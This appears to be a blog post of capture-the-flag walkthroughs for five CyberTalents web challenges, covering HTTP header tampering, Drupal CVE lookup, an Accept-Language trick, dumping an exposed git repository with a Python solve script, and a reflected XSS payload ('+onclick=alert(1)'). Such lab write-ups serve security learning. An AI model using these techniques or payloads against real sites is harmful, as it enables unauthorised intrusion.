---
title:  Walkthrough For Web Security Category In Cyber Talents Part 3 
date: 2025-10-16 07:40:00 +0200
categories: [Web Security,CyberTalents]
tags: [Web Security] 
img_path: ""  # leave blank
image: "https://i.pinimg.com/1200x/86/bd/56/86bd56a02666e9623bb02a212da98314.jpg"
---


السَّلَامُ عَلَيْكُمْ وَرَحْمَةُ اللَّهِ وَبَرَكَاتُهُ، بِسْمِ اللَّهِ، وَالصَّلَاةُ وَالسَّلَامُ عَلَى رَسُولِ اللَّهِ، الْحَمْدُ لِلَّهِ الَّذِي عَلَّمَ بِالْقَلَمِ، عَلَّمَ الإِنسَانَ مَا لَمْ يَعْلَمْ، وَالصَّلَاةُ وَالسَّلَامُ عَلَى خَيْرِ مُعَلِّمٍ النَّاسَ الْخَيْرَ، مُحَمَّدٍ صَلَّى اللَّهُ عَلَيْهِ وَسَلَّمَ، أَمَّا بَعْدُ



### SkiddyKill3r


#### Challenge Information

- **Category:** Web Security
    
- **Level:** easy
    
- **Points:** 50



#### **description**

Creative Thinking will make getting the flag so much easier

#### **Solution**

well, let's to search about anything so i use my name 'mounir'

![image](https://github.com/user-attachments/assets/50ca8bf5-495c-4b21-acc0-831ad54ae8f2)


here we go u see this result 

![image](https://github.com/user-attachments/assets/a59f7d17-cb6d-4407-840f-b3a136cbceb6)


now let's review page's source code 

![image](https://github.com/user-attachments/assets/e7f50b1a-4f64-4fe2-802c-85f0f141878a)

 
 okay i think this is good findings soo let's try to search about 'Momen' 

![image](https://github.com/user-attachments/assets/689f8764-8543-4e54-8fe7-e89046a6ec10)


well found endpoint called 'hint.php' let's what is this 

![image](https://github.com/user-attachments/assets/e2156273-0722-416c-9362-f72f7d92a12d)


after moment show this i think we now have param called show and it's have two value true or false let's and see what is happen 

![image](https://github.com/user-attachments/assets/fd64c32a-80d7-4fac-a63f-fec08467476b)


and we found this first i'll explain this code and search for exploit to bypass every function

![image](https://github.com/user-attachments/assets/220b8217-9857-443c-a855-afca8e3fe05c)


Going on, at the begining of the source code, there is a commented line , “`// Our Site Have robots.txt Too`”. I decide to visit the page robots.txt and this is what I get.

![image](https://github.com/user-attachments/assets/a84c529f-362a-4db2-8a29-39af79bb1f24)


Unfortunately, visiting the pages **_/flag.php_**, **_/flag1.jpg_**, and **_/robots.txt.php_** shows nothing. Further analysis of the source code in /hint.php, I get a hint on how to bypass the error message that is shown by visiting the page /robots.txt.php . :

“`/*   To Get The Final Flag Try To Search About The Right User-Agent And File ;)   Remember: - The Flag Not Always Exits In What We See   */`”

so, now let's set HTTP_REFERER's value to `http://cyberguy` and see what happen (u can intercept request in burp and update referer header's value or use any browser extension or use curl it's up to u   in my case i'll use browser extension )

![image](https://github.com/user-attachments/assets/d38e732a-9286-4857-b192-e701e1edd4ad)


and don't forget to set cookies 

![image](https://github.com/user-attachments/assets/57312580-d432-4258-a9f6-f78817cdd21f)


and try to access to robots.txt.php

![image](https://github.com/user-attachments/assets/fb3d18d0-9118-4337-85da-3cbe609fb08a)

it's doesn't work so after some research i try to modify the referer header from` “http://cyberguy,to “(lab-url/robots.txt.php)”`, and the method from **GET** to PUT

![image](https://github.com/user-attachments/assets/6decc1c5-c249-4290-b52f-03f313f39101)


and see we now have value to user-agent header so let's update this value and try to access on /user_check.php

![image](https://github.com/user-attachments/assets/a93de560-2628-42ec-a45a-3a473abd73a1)


----

### remote-CVE



#### Challenge Information

- **Category:** Web Security
    
- **Level:** medium
    
- **Points:** 50


#### **description**

What’s CVE ID could be used against the web application in the below target

Note: its an unauthenticated RCE vulnerability.

Flag format CVE-xxxx-xxxx

#### **Solution**

in this lab we'll focus in  description well, after read we now search for CVE so let's review source 
but after this we saw in footer "Powered by Drupal"

![image](https://github.com/user-attachments/assets/3b2f8af1-4112-4635-a31d-1a24e8f9bd85)


so what's Drupal ??

- **Drupal** is a free, open-source CMS written in PHP.
    
- It’s used to build and manage websites — from personal blogs to government portals and enterprise platforms.
    
- Known for its flexibility, scalability, and strong security.
    
- Offers thousands of **modules** (plugins) and **themes** to extend functionality and design.

so we now search about cve on Drupal but first we must know what is the version of Drupal let's review source code 

![image](https://github.com/user-attachments/assets/41cea55c-11b6-452b-94bc-e45bf7822a8d)


focus on line 16 in meta tags we now know the version is 7 well , the is solve it just search for cve in Mitre (if u don't found it u can look on this link --> [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-7600) )

----
### catchtoka



#### Challenge Information

- **Category:** Web Security
    
- **Level:** medium
    
- **Points:** 50


#### **description**

Can you catch toka

#### **Solution**

after access the lab and review source code i found nothing so i try to in intercept requests with burp to see them and i found nothing so after some search plus see lab's  Description
i then realized the solution is related to change Languages so after see request headers i found "Accept-Language" header so i try to change it to German (it just change the to de and u can see others value in this [site](https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry) ) and for more info about "Accept-Language"  u can see this [blog](https://mike-diaz006.medium.com/what-i-learned-at-work-this-week-accept-language-http-header-f0574d242cc8) soo after modified it and send request u got the flag in the body of the response 

from 

![image](https://github.com/user-attachments/assets/b52635d5-f3c5-4700-985d-2ed02cecb429)

To 

![image](https://github.com/user-attachments/assets/a43ab452-6eed-4416-a0ad-4c91233c6056)


 then send it and gooot the flag 
 
![image](https://github.com/user-attachments/assets/ed141fa2-2819-4d60-a3c3-de34cf388148)


bye bye 

----

### Sonic go brrr



#### Challenge Information

- **Category:** Web Security
    
- **Level:** medium
    
- **Points:** 50


#### **description**

Can you beat sonic?

#### **Solution**

after access the lab u see Apache web server page so i review source code and i found no thing so after see Robots.txt file i found hint tell me to use git soo i realized we'll use [GitTools](https://github.com/internetwache/GitTools) so i used dumber to see git status and what's happen (i mean commits) well , after use dumber i restore file named "index.php" (with this command "`git restore index.php`")
and after see it i make script to get the flag but first I'll explain the code 

![image](https://github.com/user-attachments/assets/242c16d0-5b84-4c84-af81-cff1dc052f6e)


then type "git status " 

![image](https://github.com/user-attachments/assets/19a42628-e5b7-4f8e-83b7-25aca3840874)


now type " git restore index.php" to restore this file 

![image](https://github.com/user-attachments/assets/fb58789c-58b4-4840-a0f3-be6488c0fb03)


and this is the index.php file 

```php
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>CodePen - CSS+SVG Motion Blur Text Effect</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<svg xmlns="http://www.w3.org/2000/svg">

  <!-- filterUnits is required to prevent clipping the blur outside the viewBox -->

    <filter id="motion-blur-filter" filterUnits="userSpaceOnUse">

      <!-- We only want horizontal blurring. x: 100, y: 0 -->

        <feGaussianBlur stdDeviation="100 0"></feGaussianBlur>
    </filter>
</svg>


<?php
Session_start();

function mstime(){

  return round(microtime(true) * 1000);
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

if(!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
    $flog=generateRandomString();
    $_SESSION['flooog'] = $flog;
    $_SESSION['counter'] = mstime();
    setcookie("secret",base64_encode($flog));



}

if (isset($_POST['Q'])) {
  if ($_POST['Q']== $_SESSION['flooog']) {

    if (  (mstime() - $_SESSION['counter']) < 2999  ){

    echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';

    }else{

 echo '<span filter-content="S">cmon.. do you call this speed?</span>';

    }

  }else{

 echo '<span filter-content="S">The encoded secret you provided is wrong :( Sonic is not impressed</span>';

    echo "\n";
  }

}else{

 echo "\n";
 echo '<span filter-content="S">Q parameter is not set!</span>';
  echo '<span filter-content="S">Challenge suspended</span>';
}
?>
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.12/vue.min.js'></script>
</body>
</html>
```


Let's go step by step to explain the code we found in index.php file, and then I'll also explain the script I created in detail.

 **Explanation of the PHP code**:

 HTML Part:

This part defines a simple HTML structure with an SVG graphic for a blur effect (it’s part of the page's design, not directly related to the challenge).

```html
<svg xmlns="http://www.w3.org/2000/svg">
    <filter id="motion-blur-filter" filterUnits="userSpaceOnUse">
        <feGaussianBlur stdDeviation="100 0"></feGaussianBlur>
    </filter>
</svg>
```

- This SVG defines a **motion blur effect** using the `feGaussianBlur` filter. It’s just part of the page's visual style.


---

 PHP Part:

Let’s dive into the PHP part where the logic for the challenge is implemented:

1. **Session Initialization**:

```php
Session_start();
```

- This starts a PHP session to store and retrieve session variables like `$_SESSION['flooog']` and `$_SESSION['counter']`.
    

2. **Helper Functions**:

```php
function mstime() {
    return round(microtime(true) * 1000);
}
```

- `mstime()` returns the current time in milliseconds by using `microtime(true)` and multiplying it by 1000.

```php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
```

- `generateRandomString()` generates a random string of a given length (default length is 10). It uses a set of characters (digits, lowercase, and uppercase) to form the random string.

---

3. **Session and Cookie Handling**:
    

```php
if (!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
    $flog = generateRandomString();
    $_SESSION['flooog'] = $flog;
    $_SESSION['counter'] = mstime();
    setcookie("secret", base64_encode($flog));
}
```

- If the session variable `$_SESSION['flooog']` or the cookie `$_COOKIE['secret']` do not exist:
    
    - It generates a random string (`$flog`) and stores it in the session (`$_SESSION['flooog']`).
        
    - It also records the current timestamp (`$_SESSION['counter']`) in milliseconds.
        
    - It sets a cookie (`secret`) with the base64-encoded value of `$flog`.
        

This means the session is now initialized, and the secret (`flooog`) is saved both in the session and in the cookie.

---

4. **Processing the User's Input**:

```php
if (isset($_POST['Q'])) {
    if ($_POST['Q'] == $_SESSION['flooog']) {
        if ((mstime() - $_SESSION['counter']) < 2999) {
            echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';
        } else {
            echo '<span filter-content="S">cmon.. do you call this speed?</span>';
        }
    } else {
        echo '<span filter-content="S">The encoded secret you provided is wrong :( Sonic is not impressed</span>';
    }
} else {
    echo '<span filter-content="S">Q parameter is not set!</span>';
    echo '<span filter-content="S">Challenge suspended</span>';
}
```

- **If the `Q` parameter is set** in a POST request:
    
    - The script checks if the value of `Q` matches `$_SESSION['flooog']`.
        
    - If it matches:
        
        - It checks if the time difference between the current time and the session's timestamp is **less than 3 seconds** (3000 ms).
            
        - If the time condition is met, it prints a success message with a flag (`flag{f4k3_fl4g}`).
            
        - If the time condition is not met, it prints a message saying the speed is too slow.
            
    - If the `Q` value doesn’t match the session's `flooog`, it prints an error message.
        
- **If the `Q` parameter is not set** in the POST request, it prints that the challenge is suspended and the `Q` parameter is missing.

---

 **Explaining the Python Script**:

Now, let’s break down the Python script I wrote to exploit the challenge:

1. **Create a Session**:

```python
s = requests.Session()
```

- This initializes a session object using the `requests` library. This object will keep track of cookies (such as the `PHPSESSID` cookie), so you can reuse them for multiple requests.

2. **Send a GET Request to Capture Cookies**:

```python
r = s.get(url)
```

- A GET request is sent to the target URL to start a session and receive cookies from the server. The `secret` cookie (which contains the base64-encoded `flooog` value) will be set by the server during this initial request.

3. **Extract the Secret Cookie**:

```python
secret_cookie = r.cookies['secret']
```

- We extract the `secret` cookie from the response. This cookie holds the base64-encoded session value (`flooog`).

4. **Decode the Cookie**:

```python
decoded_cookie = urllib.parse.unquote(secret_cookie)
flooog = base64.b64decode(decoded_cookie).decode()
```

- The `secret_cookie` is URL-encoded, so we use `urllib.parse.unquote()` to decode it first.

- Then, we decode the base64-encoded value using `base64.b64decode()` to retrieve the actual `flooog` value (the secret).

5. **Make a POST Request with the Correct `Q` Parameter**:

```python
data = {'Q': flooog}
r2 = s.post(url, data=data)
```

- Now that we have the correct `flooog` value, we send it as the `Q` parameter in a POST request to the server. This will allow us to interact with the server and check if the flag is returned.

6. **Check the Response**:

```python
print("[+] Response Status Code:", r2.status_code)
print("[+] Response Text:\n", r2.text)
```

- The response from the server is checked, and the status code and text are printed. If everything works correctly, the response will contain the flag.

And after u run  script i already explain it in above 

```python 
import requests

import base64

import urllib.parse 
  

url = "http://ur-lab-link/index.php" # use must edit this value to ue lab's link
  

s = requests.Session()

  

r = s.get(url)

  

if "secret" not in r.cookies:

    print("[-] Failed to get secret cookie!")

    exit()

  

secret_cookie = r.cookies["secret"]

print("[+] Got secret cookie (raw):", secret_cookie)

  

# Step 2: URL decode first

decoded_cookie = urllib.parse.unquote(secret_cookie)

print("[+] URL-decoded cookie:", decoded_cookie)

  

# Step 3: Base64 decode

flooog = base64.b64decode(decoded_cookie).decode()

print("[+] Decoded flooog value:", flooog)

  

# Step 4: POST with Q

data = {"Q": flooog}

r2 = s.post(url, data=data)

  

print("[+] Response Status Code:", r2.status_code)

print("[+] Response Text:\n", r2.text)
```

Well, after u run the script u got output like this and  it's contain the flag :

![image](https://github.com/user-attachments/assets/872df587-70c5-4f9d-a0d5-02ad80aec683)


---

### v13w3r


#### Challenge Information

- **Category:** Web Security
    
- **Level:** medium
    
- **Points:** 50


#### **description**

i am just an image viewer ;)

#### **Solution**

hey hey , let's start i try to input random pic's link to see what's happen and get this 

![image](https://github.com/user-attachments/assets/c2a38cbb-6558-4775-a349-46822e6110b9)


![image](https://github.com/user-attachments/assets/42342717-2a17-414e-8850-0ea5e44237e4)

well, i now realized we try to input payload (i already try it lol)  i mean what about put it after regular photo link and i submitted and got the flag payload i used --> +onclick=alert(1) because the link reflect in a tags and + this is space (url-encoded) so it must be look like this 

```html
 <a href=somethign_here onclick=alert(1) rest_of_the_tag >
```

![image](https://github.com/user-attachments/assets/23b52686-f13d-40f8-8c39-b6a7f947a96b)


----


